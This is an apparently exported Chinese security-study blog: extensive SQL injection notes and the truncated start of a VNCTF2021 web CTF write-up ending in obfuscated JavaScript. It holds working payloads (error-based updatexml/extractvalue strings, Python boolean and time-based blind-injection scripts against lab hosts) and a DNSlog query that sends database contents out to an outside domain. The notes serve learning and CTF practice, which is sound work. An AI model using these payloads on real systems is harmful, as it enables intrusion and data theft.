    <url>/2021/01/10/SQL%E6%B3%A8%E5%85%A5/</url>
    <content><![CDATA[<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>用户拥有可控参数，并且用户传入的参数被当作代码执行。</p>
<p><img src="/2021/01/10/SQL%E6%B3%A8%E5%85%A5/sql%E6%B3%A8%E5%85%A5%E6%B5%81%E7%A8%8B%E5%9B%BE.jpg" alt="sql注入流程图"></p>
 <a id="more"></a>

<h2 id="联合查询注入"><a href="#联合查询注入" class="headerlink" title="联合查询注入"></a>联合查询注入</h2><p>UNION操作符可用于合并两个或多个SELECT语句的结果集，进行sql语句拼接。</p>
<p>1.先判断是否存在注入</p>
<p>2.判断参数类型</p>
<p>3.使用ORDER BY 查询列数，观察回显的位置</p>
<p>4.获取数据库名。</p>
<p>5.获取数据库中的表名。</p>
<p>6.获取数据库的表中的所有字段名</p>
<p>7.获取字段中的数据</p>
<p><img src="/2021/01/10/SQL%E6%B3%A8%E5%85%A5/%E6%95%B0%E6%8D%AE%E5%BA%93.png" alt="数据库"></p>
<p>查询语句</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">database</span>()</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>() <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema=<span class="keyword">database</span>() <span class="keyword">and</span> table_name =<span class="string">&#x27;表名&#x27;</span> <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span>  字段 <span class="keyword">from</span>  表 <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span></span><br></pre></td></tr></table></figure>

<p>或者使用group_concat()函数</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">union <span class="keyword">select</span> <span class="number">1</span>,(<span class="keyword">select</span> <span class="keyword">group_concat</span>(schema_name) <span class="keyword">from</span> information_schema.schemata),<span class="number">3</span> <span class="comment">--+</span></span><br><span class="line"></span><br><span class="line">(<span class="keyword">select</span> <span class="keyword">group_concat</span>(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="string">&#x27;数据库名&#x27;</span>)</span><br><span class="line"></span><br><span class="line">(<span class="keyword">select</span> <span class="keyword">group_concat</span>(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name=<span class="string">&#x27;表名&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> <span class="keyword">group_concat</span>(字段名) <span class="keyword">from</span> 数据库名.表名</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h2 id="POST注入"><a href="#POST注入" class="headerlink" title="POST注入"></a>POST注入</h2><h4 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h4><p>都是一样的，不同的是，</p>
<p>参数传递是POST类型，经常用burp suite进行测试</p>
<h4 id="手动测试和上面一样"><a href="#手动测试和上面一样" class="headerlink" title="手动测试和上面一样"></a>手动测试和上面一样</h4><p>经常出现在：登录框，搜索框。</p>
<h4 id="sqlmap测试"><a href="#sqlmap测试" class="headerlink" title="sqlmap测试:"></a>sqlmap测试:</h4><p> 1.sqlmap -r 1.txt，   sqlmap -r 1.txt –dbs等</p>
<p>2.sqlmap -u <a href="http://www.xxxxx.com/">http://www.xxxxx.com</a> –data “id=1” –dbs</p>
<p>其中1.txt为我们抓包获得的内容copy to file。</p>
<p>目的：如果页面有cookie和session,这样我们就不用单独添加这些值的内容了。</p>
<p>注：如果POST传入多个值，可以通过加<code>*</code>来对<code>*</code>前面的参数进行测试。</p>
<h2 id="HEADER注入-报错注入"><a href="#HEADER注入-报错注入" class="headerlink" title="HEADER注入+报错注入"></a>HEADER注入+报错注入</h2><h4 id="原理-2"><a href="#原理-2" class="headerlink" title="原理"></a>原理</h4><ul>
<li>后台为了获取我们的信息，会导致header头（请求头）的部分参数可控，从而产生漏洞。</li>
</ul>
<h4 id="发生地方"><a href="#发生地方" class="headerlink" title="发生地方"></a>发生地方</h4><ul>
<li>http header注入通常发生用户请求头的XFF，User-Agent，referer等地方。主要是应为后台如果获取你的ip，用户信息（User-Agent）等就有可能出现header注入。 </li>
<li>黑盒测试会比较困难，白盒测试我们可以通过查看代码查看。</li>
<li>因为利用insert into 插入页面，基本不会有回显，可以通过<code>盲注</code>或者<code>报错注入</code>进行构造sql语句。</li>
</ul>
<h4 id="php超全局变量："><a href="#php超全局变量：" class="headerlink" title="php超全局变量："></a>php超全局变量：</h4><p>$_REQUEST(获取GET/POST)</p>
<p>$_GET</p>
<p>$_POST</p>
<p>$_COOKIE</p>
<p>$_SERVER(包含请求头的大部分信息，路径，以及脚本位置等等信息的数组)  功能非常强大</p>
<p>$_SERVER[‘HTTP<code>_</code>HOST’]   可获取请求头里面的host内容</p>
<p>$_SERVER[“HTTP<code>_</code>USER<code>_</code>AGENT”]  获得UA</p>
<p>$_SERVER[“REMOTE<code>_</code>ADDR”]     获取用户ip</p>
<p><a href="https://zhuanlan.zhihu.com/p/147834873">参考文章</a></p>
<h4 id="updatexml"><a href="#updatexml" class="headerlink" title="updatexml()"></a>updatexml()</h4><p> updatexml() 是用来<code>更新</code>xml的一个函数，语法：updatexml(目标xml内容，xml路径，更新后内容)</p>
<p>updatexml(1,concat(0x7e,(select database())),1)</p>
<p>select database()为我们写入的子查询，concat可以将字符串进行拼接，0x7e为<code>~</code>的16进制，数据库支持16进制。</p>
<p>我们添加了错的xml路径，从而实现报错，将我们的</p>
<hr>
<p><a href="http://injectx1.lab.aqlab.cn:81/Pass-07/index.php?action=show_code">靶场</a></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">$username = $_POST[&#x27;username&#x27;];</span><br><span class="line">$password = $_POST[&#x27;password&#x27;];</span><br><span class="line">$uagent = $_SERVER[&#x27;HTTP_USER_AGENT&#x27;];</span><br><span class="line">$jc = $username.$password;</span><br><span class="line">$sql = &#x27;<span class="keyword">select</span> *<span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> username =\<span class="string">&#x27;&#x27;</span>.$username.<span class="string">&#x27;\&#x27;</span> <span class="keyword">and</span> <span class="keyword">password</span>=\<span class="string">&#x27;&#x27;</span>.$password.<span class="string">&#x27;\&#x27;&#x27;;</span></span><br><span class="line">if(preg_match(&#x27;/.*\&#x27;.*/&#x27;,$jc)!== 0)&#123;die(&#x27;为了网站安全性，禁止输入某些特定符号&#x27;);&#125;</span><br><span class="line">mysqli_select_db($conn,&#x27;****&#x27;);//不想告诉你库名</span><br><span class="line">$result = mysqli_query($conn,$sql);</span><br><span class="line">$row = mysqli_fetch_array($result);</span><br><span class="line">$uname = $row[&#x27;username&#x27;];</span><br><span class="line">$passwd = $row[&#x27;password&#x27;];</span><br><span class="line">if($row)&#123;</span><br><span class="line">$Insql = &quot;<span class="keyword">INSERT</span> <span class="keyword">INTO</span> uagent (<span class="string">`uagent`</span>,<span class="string">`username`</span>) <span class="keyword">VALUES</span> (<span class="string">&#x27;$uagent&#x27;</span>,<span class="string">&#x27;$uname&#x27;</span>)<span class="string">&quot;;</span></span><br><span class="line"><span class="string">$result1 = mysqli_query($conn,$Insql);</span></span><br><span class="line"><span class="string">print_r(mysqli_error($conn));</span></span><br><span class="line"><span class="string">echo &#x27;成功登录&#x27;;</span></span><br></pre></td></tr></table></figure>

<p>我们查看源码发现有过滤，<code>$uagent = $_SERVER[&#39;HTTP_USER_AGENT&#39;];</code>发现服务器会获得我们UA里面的信息，并且<code>    $Insql = &quot;INSERT INTO uagent (</code>uagent<code>,</code>username<code>) VALUES (&#39;$uagent&#39;,&#39;$uname&#39;)&quot;;</code>存放数据库中。</p>
<p>User-Agent: 1’ or updatexml(1,concat(0x7e,(select database())),1) or ‘</p>
<p>或者使用User-Agent: 1’ or updatexml(1,concat(0x7e,(select database())),1)<code>,1)</code># </p>
<p>因为传入的是2个参数，我们也需要对后面的参数进行闭合。</p>
<p><img src="/2021/01/10/SQL%E6%B3%A8%E5%85%A5/Snipaste_2021-02-05_23-41-35.png" alt="Snipaste_2021-02-05_23-41-35"></p>
<p>我们看到报错的PATH，下面就是把拼接的语句换成联合查询的语句就ok了</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">&#x27; or updatexml(1,concat(0x7e,(<span class="keyword">select</span> <span class="keyword">database</span>())),<span class="number">1</span>),<span class="number">1</span>)<span class="comment">#                    爆出数据库</span></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27; or updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=database() limit 0,1)),1),1)#                                  爆出表名flag_head</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;</span> <span class="keyword">or</span> updatexml(<span class="number">1</span>,<span class="keyword">concat</span>(<span class="number">0x7e</span>,(<span class="keyword">select</span> column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema=<span class="keyword">database</span>() <span class="keyword">and</span> table_name =<span class="string">&#x27;flag_head&#x27;</span> <span class="keyword">limit</span> <span class="number">1</span>,<span class="number">1</span>)),<span class="number">1</span>),<span class="number">1</span>)<span class="comment">#      爆出字段名flag_h1</span></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27; or updatexml(1,concat(0x7e,(select flag_h1 from flag_head limit 0,1)),1),1)#   获得flag</span></span><br></pre></td></tr></table></figure>



<h4 id="extractvalue"><a href="#extractvalue" class="headerlink" title="extractvalue()"></a>extractvalue()</h4><p>该函数是对XML文档进行<code>查询</code>的函数，语法：extractvalue(目标文档路径，xml路径)</p>
<p>-1’ or (extractvalue(1,concat(0x7e,database(),0x7e))),1)<code>#</code></p>
<p>-1’ or (extractvalue(1,concat(0x7e,database(),0x7e))) or ‘</p>
<p>注意闭合。</p>
<p><img src="/2021/01/10/SQL%E6%B3%A8%E5%85%A5/Snipaste_2021-02-05_23-51-46.png" alt="Snipaste_2021-02-05_23-41-35"></p>
<p>我们同样发现报错的PATH，其余和上面同理</p>
<p>其他报错注入函数</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1.floor()</span><br><span class="line">select * from test where id&#x3D;1 and (select 1 from (select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)a);</span><br><span class="line"></span><br><span class="line">2.extractvalue()</span><br><span class="line">select * from test where id&#x3D;1 and (extractvalue(1,concat(0x7e,(select user()),0x7e)));</span><br><span class="line"></span><br><span class="line">3.updatexml()</span><br><span class="line">select * from test where id&#x3D;1 and (updatexml(1,concat(0x7e,(select user()),0x7e),1));</span><br><span class="line"></span><br><span class="line">4.geometrycollection()</span><br><span class="line">select * from test where id&#x3D;1 and geometrycollection((select * from(select * from(select user())a)b));</span><br><span class="line"></span><br><span class="line">5.multipoint()</span><br><span class="line">select * from test where id&#x3D;1 and multipoint((select * from(select * from(select user())a)b));</span><br><span class="line"></span><br><span class="line">6.polygon()</span><br><span class="line">select * from test where id&#x3D;1 and polygon((select * from(select * from(select user())a)b));</span><br><span class="line"></span><br><span class="line">7.multipolygon()</span><br><span class="line">select * from test where id&#x3D;1 and multipolygon((select * from(select * from(select user())a)b));</span><br><span class="line"></span><br><span class="line">8.linestring()</span><br><span class="line">select * from test where id&#x3D;1 and linestring((select * from(select * from(select user())a)b));</span><br><span class="line"></span><br><span class="line">9.multilinestring()</span><br><span class="line">select * from test where id&#x3D;1 and multilinestring((select * from(select * from(select user())a)b));</span><br><span class="line"></span><br><span class="line">10.exp()</span><br><span class="line">select * from test where id&#x3D;1 and exp(~(select * from(select user())a));</span><br></pre></td></tr></table></figure>









<h2 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h2><h4 id="场景"><a href="#场景" class="headerlink" title="场景"></a>场景</h4><p>服务器对我们的输入错误并没有很明显的报错回显。</p>
<h4 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h4><p>布尔盲注：  页面只会显示true和false。</p>
<p>时间盲注 ： 如果页面无论输入什么页面都正常显示，但当我们加入例如 sleep(4),页面延迟4秒，页面即存在时间盲注。</p>
<h4 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h4><p>length() 返回字符串长度</p>
<p>substr()截取字符串。substr(‘str’,位置,length)  stustr(‘qwer’,1,1)  返回q，stustr(‘qwer’,2,1)返回w。布尔盲注和使用。</p>
<p>ascii()返回ASCLL值</p>
<p>if( condition，true _result , false_result ) 例如：if(5=5,1,0)就会返回1，if(6=5,1,0)就会返回0。延时盲注会使用。</p>
<hr>
<h4 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h4><p>and length(database())=11–+</p>
<p>and ascii(substr(database(),1,1))=111–+     #利用ascii值的方式进行盲注</p>
<p>and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))=111–+</p>
<p>and ascii(substr((select column_name from information_schema.columns where table_schema=database() and table_name =’表名’ limit 0,1))=111–+</p>
<p>and ascii(substr((select  字段 from  表 limit 0,1))=111–+</p>
<p>这个是通过bp跑的其中一个图，里面长度有时候不好确认，我们可以添加Grep-Match进行匹配页面相关字符串进行筛选，方便我们统计s。</p>
<p><img src="/2021/01/10/SQL%E6%B3%A8%E5%85%A5/%E7%9B%B21.png" alt="盲1"></p>
<p>不会吧，不会吧，还有人不会写python盲注脚本吧，额好像在说我i</p>
<p>下面是 学习的脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> requests  <span class="comment">#bool盲注,二分盲注</span></span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">url = <span class="string">&quot;http://injectx1.lab.aqlab.cn:81/Pass-10/index.php&quot;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getdatabase</span>():</span></span><br><span class="line">    <span class="keyword">global</span> url</span><br><span class="line">    database = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">20</span>):</span><br><span class="line">        min = <span class="number">32</span></span><br><span class="line">        max = <span class="number">127</span></span><br><span class="line">        mid = (min+max)//<span class="number">2</span></span><br><span class="line">        <span class="keyword">while</span> max&gt;min:</span><br><span class="line">            payload = <span class="string">&quot;?id=1 and ascii(substr(database(),%d,1))&gt;%d&quot;</span> % (i,mid)    </span><br><span class="line">            <span class="comment">#数据库的第一位ascii值 &gt;mid  =&gt; 我们要使用&gt;%d,不然你下面if,else就要改</span></span><br><span class="line">            url1=url+payload</span><br><span class="line">            <span class="comment">#print(url1)</span></span><br><span class="line">            req=requests.get(url1,timeout=<span class="number">10</span>)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;No results found&quot;</span> <span class="keyword">in</span> req.text:</span><br><span class="line">                max = mid</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                min = mid+<span class="number">1</span></span><br><span class="line">            mid = (min + max)//<span class="number">2</span></span><br><span class="line">        <span class="keyword">if</span> mid&lt;=<span class="number">32</span> <span class="keyword">or</span> mid&gt;=<span class="number">127</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        database +=chr(mid)</span><br><span class="line">        print(i)</span><br><span class="line">        print(<span class="string">&quot;database =&gt;&quot;</span>+database)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">getdatabase()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>其他利用方式</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;1&#39; and IFNULL((substr((select user()),1,1)&#x3D;&#39;r&#39;),0) -- +</span><br><span class="line">#如果 IFNULL 第一个参数的表达式为 NULL，则返回第二个参数的备用值，不为 Null 则输出值</span><br><span class="line"></span><br><span class="line">?id&#x3D;1&#39; and strcmp((substr((select user()),1,1)&#x3D;&#39;r&#39;),1) -- +</span><br><span class="line">#若所有的字符串均相同，STRCMP() 返回 0，若根据当前分类次序，第一个参数小于第二个，则返回 -1 ，其它情况返回 1</span><br></pre></td></tr></table></figure>



<h4 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h4><p>当sleep被过滤后，可以考虑用笛卡尔积进行时间盲注：贴的大佬脚本</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line">from time import *</span><br><span class="line"></span><br><span class="line">url&#x3D;&quot;http:&#x2F;&#x2F;59213b9c-a875-4ea3-994a-ab8b17cc4954.node3.buuoj.cn&#x2F;user&#x2F;login&quot;</span><br><span class="line">flag&#x3D;&quot;&quot;</span><br><span class="line">for i in range(1,100):</span><br><span class="line">    min&#x3D;32</span><br><span class="line">    max&#x3D;128</span><br><span class="line">    while 1:</span><br><span class="line">        j&#x3D;min+(max-min)&#x2F;&#x2F;2</span><br><span class="line">        if j&#x3D;&#x3D;min:</span><br><span class="line">            flag+&#x3D;chr(j)</span><br><span class="line">            print(flag)</span><br><span class="line">            break</span><br><span class="line">        payload&#x3D;&quot;-1&#39;or if(ascii(substr(password,&#123;&#125;,1))&lt;&#123;&#125;,(SELECT count(*) FROM information_schema.tables A,information_schema.tables B,information_schema.tables C),1)#&quot;.format(i,j)</span><br><span class="line">        data&#x3D;&#123;</span><br><span class="line">            &#39;username&#39;:&#39;admin&#39;,</span><br><span class="line">            &#39;password&#39;:payload</span><br><span class="line">        &#125;</span><br><span class="line">        try:</span><br><span class="line">            r&#x3D;requests.post(url&#x3D;url,data&#x3D;data,timeout&#x3D;0.7)</span><br><span class="line">            min&#x3D;j</span><br><span class="line">        except:</span><br><span class="line">            max&#x3D;j</span><br><span class="line">        sleep(0.4)</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h4 id="dnslog注入"><a href="#dnslog注入" class="headerlink" title="dnslog注入"></a>dnslog注入</h4><p>通过dns解析将数据库查询的不能回显的数据外带出来。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1.select load_file(&#39;d:&#x2F;1.txt&#39;);  </span><br><span class="line">用这个函数  mysql需要配置</span><br><span class="line">2.    UNC路径 windows中一个SMB服务，通过该路径请求一些数据    \\servername\xxx\xxx-&gt; \\ip\xxx\xx  -&gt;\\abc.com\\abc（出现了域名解析）</span><br><span class="line">也可以这样写   &#x2F;&#x2F;servername&#x2F;1.txt （推荐</span><br></pre></td></tr></table></figure>

<p>语句</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">load_file()一次只能传输一条数据，所以查询的时候需要使用limit来一个一个的解析。</span><br><span class="line">select load_file(concat(&#39;&#x2F;&#x2F;&#39;,(select database()),&#39;.zwuddi.dnslog.cn&#x2F;a.txt&#39;))；</span><br><span class="line"></span><br><span class="line">总结：</span><br><span class="line">select load_file(concat(&#39;&#x2F;&#x2F;&#39;,(sql语句),&#39;.zwuddi.dnslog.cn&#x2F;a.txt&#39;))</span><br></pre></td></tr></table></figure>

<p>例如</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;59.63.200.79:8022&#x2F;dns&#x2F;index.php?id&#x3D;1 and (select  load_file(concat(&#39;&#x2F;&#x2F;&#39;,(select database()),&#39;.5anley.dnslog.cn&#x2F;a.txt&#39;)))</span><br></pre></td></tr></table></figure>



<p>tips：</p>
<p>盲注五种方法：sleep()，benchmark(t,exp)，笛卡尔积，GET_LOCK() RLIKE正则</p>
<p>提高盲注效率：二分法，位运算法</p>
<h1 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h1><p>PHP发送请求到mysql时经过一次<code>gbk</code>编码，PHP会将获取到的数据进行<code>魔术引号</code>的处理，因为GBK是双字节编码，所以我们提交的<code>%df</code>这个字符和转译的反斜杠组成了新的汉字，然后数据库处理的时候是根据GBK去处理的，然后<code>单引号就逃逸了出来</code>，进行闭合</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：&#39;   -&gt;\&#39;</span><br><span class="line"></span><br><span class="line">\ -&gt; %5c</span><br><span class="line"></span><br><span class="line">输入：%df&#39; -&gt; %df\&#39; -&gt;運&#39;</span><br><span class="line"></span><br><span class="line">%df%5c -&gt; 汉字</span><br></pre></td></tr></table></figure>

<p>利用:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">id&#x3D;1%df&#39; union select 1,2,3 -- qwe</span><br></pre></td></tr></table></figure>



<p>魔术引号PHP5.3.0后就被废除，5.4.0后就被移除。（但可能会有人写魔术引号函数进来利用）.</p>
<h1 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">插入恶意数据</span><br><span class="line">引用恶意数据</span><br></pre></td></tr></table></figure>



<p><img src="/2021/01/10/SQL%E6%B3%A8%E5%85%A5/webp.webp" alt="img"></p>
<h1 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h1><h3 id><a href="#" class="headerlink" title></a></h3><p><a href="https://blog.csdn.net/weixin_45345384/article/details/120888172">https://blog.csdn.net/weixin_45345384/article/details/120888172</a></p>
<ul>
<li>预编译</li>
<li>PDO</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">模拟预处理的方式是在客户端本地执行预处理的模拟，最终将拼好的sql语句发送到mysql服务器进行执行(实际上就是完成了字符串拼接</span><br><span class="line"></span><br><span class="line">本地预处理方式则是分两步：第一步是prepare阶段，发送带有占位符的sql语句到mysql服务器</span><br><span class="line">然后就可以多次发送占位符参数给mysql服务器进行执行(多次执行</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>防止了sql语句的拼接</p>
<ul>
<li>正则规则</li>
</ul>
<h1 id="数据库类型判断"><a href="#数据库类型判断" class="headerlink" title="数据库类型判断"></a>数据库类型判断</h1><h3 id="脚本语言-数据库"><a href="#脚本语言-数据库" class="headerlink" title="脚本语言+数据库"></a>脚本语言+数据库</h3><p>常用搭配：</p>
<table>
<thead>
<tr>
<th>PHP</th>
<th>MYSQL</th>
</tr>
</thead>
<tbody><tr>
<td>asp</td>
<td>access/mssql</td>
</tr>
<tr>
<td>asp.net(aspx)</td>
<td>msssql</td>
</tr>
<tr>
<td>java  (jsp)</td>
<td>oracle</td>
</tr>
</tbody></table>
<h3 id="数据库特性"><a href="#数据库特性" class="headerlink" title="数据库特性"></a>数据库特性</h3><ol>
<li>注释符</li>
</ol>
<p>mysql: <code>/*</code></p>
<p>Oracle和Mssql：<code>--</code></p>
<p>子句查询标识符：<code>; </code>     (Oracle不支持多行，如果错误，可能是Oracle数据库)</p>
<ol start="2">
<li>函数</li>
</ol>
<p><code>and (select count(*)from MSysAccessObjects)&gt;0 </code>   access数据库<br>        <code>    and (select count(*)from sysobjects)&gt;0</code>返回正常说明是mssql数据库and                 <code>     length(user0)&gt;10</code>返回正常说明是 Mysql<br>Oracle  可以根据from dual 虚拟库判断<br>    <code>select extract(dow from now)) . select version) --</code>     Postgresql </p>
<p>参考5号mo区</p>
<p>总参考：</p>
<p><a href="https://mp.weixin.qq.com/s/xz4qtjgLDuozyv9IYMwbLA">https://mp.weixin.qq.com/s/xz4qtjgLDuozyv9IYMwbLA</a></p>
]]></content>
      <categories>
        <category>常见数据库注入</category>
      </categories>
      <tags>
        <tag>SQL注入</tag>
      </tags>
  </entry>
  <entry>
    <title>VNCTF2021-web</title>
    <url>/2021/03/29/VNCTF2021-web/</url>
    <content><![CDATA[<h2 id="Ez-game"><a href="#Ez-game" class="headerlink" title="Ez_game"></a>Ez_game</h2><p><img src="/2021/03/29/VNCTF2021-web/1.png" alt="1"></p>
<p>玩游戏，太菜了，通不了关。自己复现总结下网上的wp。</p>
<p>F12看源码，重点看game.js</p>
<a id="more"></a>

<p><img src="/2021/03/29/VNCTF2021-web/2.png" alt="2"></p>
<p>####思路1</p>
<p>在game.js里面我们发现类似加密的东西。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[&#39;sojson.v4&#39;][&quot;\x66\x69\x6c\x74\x65\x72&quot;][&quot;\x63\x6f\x6e\x73\x74\x72\x75\x63\x74\x6f\x72&quot;]((([&#39;sojson.v4&#39;]+[])[&quot;\x63\x6f\x6e\x73\x74\x72\x75\x63\x74\x6f\x72&quot;][&#39;\x66\x72\x6f\x6d\x43\x68\x61\x72\x43\x6f\x64\x65&#39;][&#39;\x61\x70\x70\x6c\x79&#39;](null,&quot;118h97x114w32l95m95N101x110O99d111B100u101w32F61P32u39R106k115w106O105F97z109R105f46p99y111A109U39d44F10G32U32F32r32G95V97p32D61Y32X123W125h44r10M32V32P32x32h95X48M120O98J52A56I51A32r61d32v91o34Q95c100n101M99e111I100l101I34b44r32X34r104N116Z116m112B58A47b47P119M119d119M46z115W111I106V115f111s110m46J99D111W109Z47g106R97c118D97F115L99I114Y105F112v116E111l98m102Q117d115E99x97K116r111U114v46s104d116B109F108Z34e93B59q10m40r102O117f110Z99D116D105a111a110u40Y95J48O120H100Q54k52k50e120I49a41P32f123s10E32j32I32d32K95E48D120k100R54S52g50O120H49y91J95q48X120w98C52a56R51E91m48B93c93E32d61e32w95X48v120b98L52e56b51O91m49b93C10Q125V41N40t95r97g41L59X10M118d97I114t32E95f95x79y120f97D50O55p56y49X32I61j32A91K34i34t44h32L34a45m112w97p117H115M101E100z45m34r44g32Q34y87v105k110E33A32h102S108G97y103u123E116k104V105l115E95F103u97g109Y101I95l105R115A95x102G117h110l110E121M33B125f34N44c32q34f71C97L109O101x32c79k118R101J114R33b34L44V32h34U80g114e101b115c115t32c69w115I99g97u112W101z34C44h32d34a120f34k44B32W34i121H34q44x32P34E99x101x110k116J101Z114j34c44B32s34B117V110j100K101A102U105M110L101x100T34k44u32U34R108t111X103q34W44p32M34o21024U38500O34R44T32u34a29256O26412t21495E65292k106N115v20250y23450F34N44f32V34Q26399e24377C31383B65292R34u44t32j34y36824A35831C25903t25345D25105o20204W30340R24037P20316L34R44y32w34o106Z115A106T105F97b34i44a32m34u109T105L46e99p111F109l34U93m59Y10u108S101q116s32P98f105A103l84N101h120n116V32A61B32t95V95W79u120a97z50N55J56g49r91g48C120L48a93r59K10k105U102S32K40X112d97m117q115P101T100A41S32r123R10r32D32a32X32t98Y105Y103N84I101p120j116U32e61J32R95g95v79i120F97F50n55h56H49d91S48x120N49u93H10C125z59O10C105W102e32t40G119n105T110x84r105G109Y101W114q46C73s115m83G101O116j40m41O41R32S123R10c32I32b32A32V98x105X103v84E101b120V116V32L61P32N95e95u79I120v97W50T55W56i49S91j48m120O50d93k10g125J59G10Q105p102m32Y40O112J108s97c121w101U114u46P73a115D68E101Y97D100E40g41g41Q32Y123r10K32X32T32q32r98b105q103i84o101V120D116v32N61H32b95R95J79q120i97q50X55o56g49G91T48Z120F51G93l59k10c32v32f32e32P68u114l97N119q84f101x120z116m40j95r95I79n120R97E50x55o56h49y91p48Q120z52L93g44k32E109H97Q105E110w67Z97l110d118S97M115j83a105B122j101E91p95n95Y79U120S97H50C55a56l49E91z48w120A53C93Y93I32b47M32o50R44R32w109n97U105b110j67h97M110H118j97X115g83D105M122n101W91J95q95y79x120i97R50Y55z56s49N91z48v120R54s93a93S32I47z32A50k32w43S32f56j48j44T32B52Y50c41O10V125M59f10h68n114V97m119f84G101C120P116u40E98i105M103U84C101e120d116q44f32Z109v97i105R110G67u97m110Q118e97n115K83G105V122M101j91Q95Y95y79M120f97G50k55i56C49c91x48j120R53F93a93L32b47p32Z50k44a32l109c97r105A110W67i97Y110t118H97y115J83H105C122r101R91a95L95s79a120d97M50G55H56k49O91m48p120R54y93d93J32x47y32c50c32Y45d32C56M48i44r32b55G50f44j32x95j95r79S120i97g50J55V56a49a91Y48f120w55c93M44M32s50p41D59x59h59g10r40L102e117n110g99S116k105D111t110Y40M95J48s120f53y49N57K55H120Y50z44F32z95B48b120t53z49A57D55X120n51H44w32o95P48t120g53n49M57G55n120T52U44D32B95A48B120Z53K49H57t55X120d53L44f32o95J48R120D53s49H57d55J120b54Y44w32U95u48g120J53Q49v57B55s120a55H41z32L123K10G32X32F32V32W95k48o120T53S49I57d55s120i55d32O61X32n95B95n79d120E97E50s55o56w49j91N48z120D56R93R59j10p32Q32s32e32H95F48O120Y53F49C57W55r120q53M32f61U32Y102R117F110N99c116V105r111y110w40I95X48h120s53Y49o57q55k120o56Q41f32S123S10R32C32B32t32f32r32q32F32Z105Y102S32o40c116E121R112d101G111f102m32p97d108Q101M114s116V32G33s61C61z32B95p48W120e53S49y57p55Q120C55o41q32L123z10I32u32a32y32W32e32b32h32W32s32m32l32c97I108C101N114t116V40P95w48X120x53F49M57d55B120x56u41F10C32F32A32B32h32F32r32y32w125L59G10o32f32T32O32T32O32c32H32D105d102v32H40i116V121a112R101e111G102B32D99O111n110L115o111X108W101S32D33C61H61G32o95u48e120z53k49d57j55s120E55m41p32c123o10V32I32B32R32A32Y32N32H32E32R32l32V32P99D111R110i115r111m108h101D91Z95i95s79g120K97d50W55w56r49n91E48l120W57W93F93R40P95D48G120q53Q49d57p55q120M56R41F10q32C32N32u32X32T32E32d32X125W10D32P32h32i32Y125N59D10v32J32C32X32B95V48w120K53C49I57r55I120E52C32Q61E32X102o117o110I99u116M105C111z110h40v95g48L120b53d49q57e55J120L57j44C32F95R48X120M53S49U57w55h120I50w41W32r123j10q32e32k32e32y32Z32I32g32z114c101D116A117A114V110w32x95p48H120k53O49r57b55Z120w57Q32N43M32A95I